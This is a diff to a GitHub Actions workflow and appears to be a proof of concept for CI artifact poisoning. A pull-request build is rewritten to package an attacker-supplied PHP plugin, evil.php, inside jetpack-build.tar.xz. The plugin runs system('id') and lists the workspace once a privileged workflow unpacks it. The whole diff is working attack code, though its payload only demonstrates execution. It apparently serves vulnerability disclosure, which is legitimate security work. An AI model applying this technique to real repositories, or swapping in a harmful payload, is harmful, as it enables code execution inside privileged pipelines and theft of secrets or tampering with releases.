@@ -1,7 +1,5 @@
 name: Build
 on:
-  push:
-    branches: [main]
   pull_request:
 permissions:
   contents: read
@@ -9,11 +7,19 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - name: Create build artifact
+      - uses: actions/checkout@v4
+      - name: Craft attacker-controlled build artifact
         run: |
           mkdir -p build/mirror
-          printf 'src\tmirror\tslug\n' > build/plugins.tsv
-          echo benign > build/mirror/README.txt
+          printf 'poc\tmirror\tevil\n' > build/plugins.tsv
+          cat > build/mirror/evil.php <<'PHP'
+          <?php
+          // Plugin Name: Evil
+          // Description: Attacker-supplied plugin shipped inside jetpack-build.tar.xz
+          echo "=== PWNED: attacker artifact code executed in the privileged workflow ===\n";
+          system('id');
+          system('echo "--- workspace context ---"; pwd; ls -la');
+          PHP
           tar -cJf jetpack-build.tar.xz build
       - uses: actions/upload-artifact@v4
         with:
